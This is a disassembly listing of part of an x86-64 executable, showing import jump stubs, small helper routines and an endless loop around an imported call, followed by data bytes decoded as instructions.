  402e0c:	90                   	nop
  402e0d:	90                   	nop
  402e0e:	90                   	nop
  402e0f:	90                   	nop
  402e10:	ff 25 e6 65 00 00    	jmp    *0x65e6(%rip)        # 0x4093fc
  402e16:	90                   	nop
  402e17:	90                   	nop
  402e18:	ff 25 d6 65 00 00    	jmp    *0x65d6(%rip)        # 0x4093f4
  402e1e:	90                   	nop
  402e1f:	90                   	nop
  402e20:	ff 25 c6 65 00 00    	jmp    *0x65c6(%rip)        # 0x4093ec
  402e26:	90                   	nop
  402e27:	90                   	nop
  402e28:	ff 25 b6 65 00 00    	jmp    *0x65b6(%rip)        # 0x4093e4
  402e2e:	90                   	nop
  402e2f:	90                   	nop
  402e30:	ff 25 a6 65 00 00    	jmp    *0x65a6(%rip)        # 0x4093dc
  402e36:	90                   	nop
  402e37:	90                   	nop
  402e38:	ff 25 96 65 00 00    	jmp    *0x6596(%rip)        # 0x4093d4
  402e3e:	90                   	nop
  402e3f:	90                   	nop
  402e40:	ff 25 86 65 00 00    	jmp    *0x6586(%rip)        # 0x4093cc
  402e46:	90                   	nop
  402e47:	90                   	nop
  402e48:	ff 25 76 65 00 00    	jmp    *0x6576(%rip)        # 0x4093c4
  402e4e:	90                   	nop
  402e4f:	90                   	nop
  402e50:	ff 25 66 65 00 00    	jmp    *0x6566(%rip)        # 0x4093bc
  402e56:	90                   	nop
  402e57:	90                   	nop
  402e58:	ff 25 56 65 00 00    	jmp    *0x6556(%rip)        # 0x4093b4
  402e5e:	90                   	nop
  402e5f:	90                   	nop
  402e60:	ff 25 46 65 00 00    	jmp    *0x6546(%rip)        # 0x4093ac
  402e66:	90                   	nop
  402e67:	90                   	nop
  402e68:	ff 25 36 65 00 00    	jmp    *0x6536(%rip)        # 0x4093a4
  402e6e:	90                   	nop
  402e6f:	90                   	nop
  402e70:	ff 25 26 65 00 00    	jmp    *0x6526(%rip)        # 0x40939c
  402e76:	90                   	nop
  402e77:	90                   	nop
  402e78:	ff 25 16 65 00 00    	jmp    *0x6516(%rip)        # 0x409394
  402e7e:	90                   	nop
  402e7f:	90                   	nop
  402e80:	ff 25 06 65 00 00    	jmp    *0x6506(%rip)        # 0x40938c
  402e86:	90                   	nop
  402e87:	90                   	nop
  402e88:	ff 25 ee 64 00 00    	jmp    *0x64ee(%rip)        # 0x40937c
  402e8e:	90                   	nop
  402e8f:	90                   	nop
  402e90:	ff 25 de 64 00 00    	jmp    *0x64de(%rip)        # 0x409374
  402e96:	90                   	nop
  402e97:	90                   	nop
  402e98:	ff 25 c6 64 00 00    	jmp    *0x64c6(%rip)        # 0x409364
  402e9e:	90                   	nop
  402e9f:	90                   	nop
  402ea0:	ff 25 b6 64 00 00    	jmp    *0x64b6(%rip)        # 0x40935c
  402ea6:	90                   	nop
  402ea7:	90                   	nop
  402ea8:	ff 25 a6 64 00 00    	jmp    *0x64a6(%rip)        # 0x409354
  402eae:	90                   	nop
  402eaf:	90                   	nop
  402eb0:	ff 25 86 64 00 00    	jmp    *0x6486(%rip)        # 0x40933c
  402eb6:	90                   	nop
  402eb7:	90                   	nop
  402eb8:	ff 25 76 64 00 00    	jmp    *0x6476(%rip)        # 0x409334
  402ebe:	90                   	nop
  402ebf:	90                   	nop
  402ec0:	53                   	push   %rbx
  402ec1:	48 83 ec 20          	sub    $0x20,%rsp
  402ec5:	89 cb                	mov    %ecx,%ebx
  402ec7:	e8 54 00 00 00       	call   0x402f20
  402ecc:	89 d9                	mov    %ebx,%ecx
  402ece:	48 8d 14 49          	lea    (%rcx,%rcx,2),%rdx
  402ed2:	48 c1 e2 04          	shl    $0x4,%rdx
  402ed6:	48 01 d0             	add    %rdx,%rax
  402ed9:	48 83 c4 20          	add    $0x20,%rsp
  402edd:	5b                   	pop    %rbx
  402ede:	c3                   	ret
  402edf:	90                   	nop
  402ee0:	48 8b 05 69 5a 00 00 	mov    0x5a69(%rip),%rax        # 0x408950
  402ee7:	c3                   	ret
  402ee8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402eef:	00 
  402ef0:	48 89 c8             	mov    %rcx,%rax
  402ef3:	48 87 05 56 5a 00 00 	xchg   %rax,0x5a56(%rip)        # 0x408950
  402efa:	c3                   	ret
  402efb:	90                   	nop
  402efc:	90                   	nop
  402efd:	90                   	nop
  402efe:	90                   	nop
  402eff:	90                   	nop
  402f00:	48 8b 05 c9 24 00 00 	mov    0x24c9(%rip),%rax        # 0x4053d0
  402f07:	48 8b 00             	mov    (%rax),%rax
  402f0a:	c3                   	ret
  402f0b:	90                   	nop
  402f0c:	90                   	nop
  402f0d:	90                   	nop
  402f0e:	90                   	nop
  402f0f:	90                   	nop
  402f10:	48 8b 05 c9 24 00 00 	mov    0x24c9(%rip),%rax        # 0x4053e0
  402f17:	48 8b 00             	mov    (%rax),%rax
  402f1a:	c3                   	ret
  402f1b:	90                   	nop
  402f1c:	90                   	nop
  402f1d:	90                   	nop
  402f1e:	90                   	nop
  402f1f:	90                   	nop
  402f20:	ff 25 26 64 00 00    	jmp    *0x6426(%rip)        # 0x40934c
  402f26:	90                   	nop
  402f27:	90                   	nop
  402f28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  402f2f:	00 
  402f30:	ff 25 ee 63 00 00    	jmp    *0x63ee(%rip)        # 0x409324
  402f36:	90                   	nop
  402f37:	90                   	nop
  402f38:	ff 25 de 63 00 00    	jmp    *0x63de(%rip)        # 0x40931c
  402f3e:	90                   	nop
  402f3f:	90                   	nop
  402f40:	ff 25 ce 63 00 00    	jmp    *0x63ce(%rip)        # 0x409314
  402f46:	90                   	nop
  402f47:	90                   	nop
  402f48:	ff 25 be 63 00 00    	jmp    *0x63be(%rip)        # 0x40930c
  402f4e:	90                   	nop
  402f4f:	90                   	nop
  402f50:	ff 25 ae 63 00 00    	jmp    *0x63ae(%rip)        # 0x409304
  402f56:	90                   	nop
  402f57:	90                   	nop
  402f58:	ff 25 9e 63 00 00    	jmp    *0x639e(%rip)        # 0x4092fc
  402f5e:	90                   	nop
  402f5f:	90                   	nop
  402f60:	ff 25 8e 63 00 00    	jmp    *0x638e(%rip)        # 0x4092f4
  402f66:	90                   	nop
  402f67:	90                   	nop
  402f68:	ff 25 7e 63 00 00    	jmp    *0x637e(%rip)        # 0x4092ec
  402f6e:	90                   	nop
  402f6f:	90                   	nop
  402f70:	ff 25 6e 63 00 00    	jmp    *0x636e(%rip)        # 0x4092e4
  402f76:	90                   	nop
  402f77:	90                   	nop
  402f78:	ff 25 5e 63 00 00    	jmp    *0x635e(%rip)        # 0x4092dc
  402f7e:	90                   	nop
  402f7f:	90                   	nop
  402f80:	ff 25 4e 63 00 00    	jmp    *0x634e(%rip)        # 0x4092d4
  402f86:	90                   	nop
  402f87:	90                   	nop
  402f88:	ff 25 3e 63 00 00    	jmp    *0x633e(%rip)        # 0x4092cc
  402f8e:	90                   	nop
  402f8f:	90                   	nop
  402f90:	ff 25 2e 63 00 00    	jmp    *0x632e(%rip)        # 0x4092c4
  402f96:	90                   	nop
  402f97:	90                   	nop
  402f98:	ff 25 1e 63 00 00    	jmp    *0x631e(%rip)        # 0x4092bc
  402f9e:	90                   	nop
  402f9f:	90                   	nop
  402fa0:	ff 25 0e 63 00 00    	jmp    *0x630e(%rip)        # 0x4092b4
  402fa6:	90                   	nop
  402fa7:	90                   	nop
  402fa8:	ff 25 fe 62 00 00    	jmp    *0x62fe(%rip)        # 0x4092ac
  402fae:	90                   	nop
  402faf:	90                   	nop
  402fb0:	ff 25 ee 62 00 00    	jmp    *0x62ee(%rip)        # 0x4092a4
  402fb6:	90                   	nop
  402fb7:	90                   	nop
  402fb8:	ff 25 de 62 00 00    	jmp    *0x62de(%rip)        # 0x40929c
  402fbe:	90                   	nop
  402fbf:	90                   	nop
  402fc0:	ff 25 ce 62 00 00    	jmp    *0x62ce(%rip)        # 0x409294
  402fc6:	90                   	nop
  402fc7:	90                   	nop
  402fc8:	ff 25 be 62 00 00    	jmp    *0x62be(%rip)        # 0x40928c
  402fce:	90                   	nop
  402fcf:	90                   	nop
  402fd0:	ff 25 ae 62 00 00    	jmp    *0x62ae(%rip)        # 0x409284
  402fd6:	90                   	nop
  402fd7:	90                   	nop
  402fd8:	ff 25 9e 62 00 00    	jmp    *0x629e(%rip)        # 0x40927c
  402fde:	90                   	nop
  402fdf:	90                   	nop
  402fe0:	ff 25 8e 62 00 00    	jmp    *0x628e(%rip)        # 0x409274
  402fe6:	90                   	nop
  402fe7:	90                   	nop
  402fe8:	ff 25 7e 62 00 00    	jmp    *0x627e(%rip)        # 0x40926c
  402fee:	90                   	nop
  402fef:	90                   	nop
  402ff0:	ff 25 6e 62 00 00    	jmp    *0x626e(%rip)        # 0x409264
  402ff6:	90                   	nop
  402ff7:	90                   	nop
  402ff8:	ff 25 5e 62 00 00    	jmp    *0x625e(%rip)        # 0x40925c
  402ffe:	90                   	nop
  402fff:	90                   	nop
  403000:	ff 25 4e 62 00 00    	jmp    *0x624e(%rip)        # 0x409254
  403006:	90                   	nop
  403007:	90                   	nop
  403008:	ff 25 3e 62 00 00    	jmp    *0x623e(%rip)        # 0x40924c
  40300e:	90                   	nop
  40300f:	90                   	nop
  403010:	ff 25 2e 62 00 00    	jmp    *0x622e(%rip)        # 0x409244
  403016:	90                   	nop
  403017:	90                   	nop
  403018:	ff 25 1e 62 00 00    	jmp    *0x621e(%rip)        # 0x40923c
  40301e:	90                   	nop
  40301f:	90                   	nop
  403020:	ff 25 0e 62 00 00    	jmp    *0x620e(%rip)        # 0x409234
  403026:	90                   	nop
  403027:	90                   	nop
  403028:	ff 25 fe 61 00 00    	jmp    *0x61fe(%rip)        # 0x40922c
  40302e:	90                   	nop
  40302f:	90                   	nop
  403030:	ff 25 ee 61 00 00    	jmp    *0x61ee(%rip)        # 0x409224
  403036:	90                   	nop
  403037:	90                   	nop
  403038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  40303f:	00 
  403040:	53                   	push   %rbx
  403041:	48 83 ec 20          	sub    $0x20,%rsp
  403045:	e8 06 e9 ff ff       	call   0x401950
  40304a:	31 c9                	xor    %ecx,%ecx
  40304c:	e8 a7 e7 ff ff       	call   0x4017f8
  403051:	48 8b 1d 94 62 00 00 	mov    0x6294(%rip),%rbx        # 0x4092ec
  403058:	b9 10 27 00 00       	mov    $0x2710,%ecx
  40305d:	ff d3                	call   *%rbx
  40305f:	eb f7                	jmp    0x403058
  403061:	90                   	nop
  403062:	90                   	nop
  403063:	90                   	nop
  403064:	90                   	nop
  403065:	90                   	nop
  403066:	90                   	nop
  403067:	90                   	nop
  403068:	90                   	nop
  403069:	90                   	nop
  40306a:	90                   	nop
  40306b:	90                   	nop
  40306c:	90                   	nop
  40306d:	90                   	nop
  40306e:	90                   	nop
  40306f:	90                   	nop
  403070:	e9 cb e4 ff ff       	jmp    0x401540
  403075:	90                   	nop
  403076:	90                   	nop
  403077:	90                   	nop
  403078:	90                   	nop
  403079:	90                   	nop
  40307a:	90                   	nop
  40307b:	90                   	nop
  40307c:	90                   	nop
  40307d:	90                   	nop
  40307e:	90                   	nop
  40307f:	90                   	nop
  403080:	ff                   	(bad)
  403081:	ff                   	(bad)
  403082:	ff                   	(bad)
  403083:	ff                   	(bad)
  403084:	ff                   	(bad)
  403085:	ff                   	(bad)
  403086:	ff                   	(bad)
  403087:	ff 70 30             	push   0x30(%rax)
  40308a:	40 00 00             	rex add %al,(%rax)
	...
  403095:	00 00                	add    %al,(%rax)
  403097:	00 ff                	add    %bh,%bh
  403099:	ff                   	(bad)
  40309a:	ff                   	(bad)
  40309b:	ff                   	(bad)
  40309c:	ff                   	(bad)
  40309d:	ff                   	(bad)
  40309e:	ff                   	(bad)
  40309f:	ff 00                	incl   (%rax)
  4030a1:	00 00                	add    %al,(%rax)
  4030a3:	00 00                	add    %al,(%rax)
  4030a5:	00 00                	add    %al,(%rax)
	...
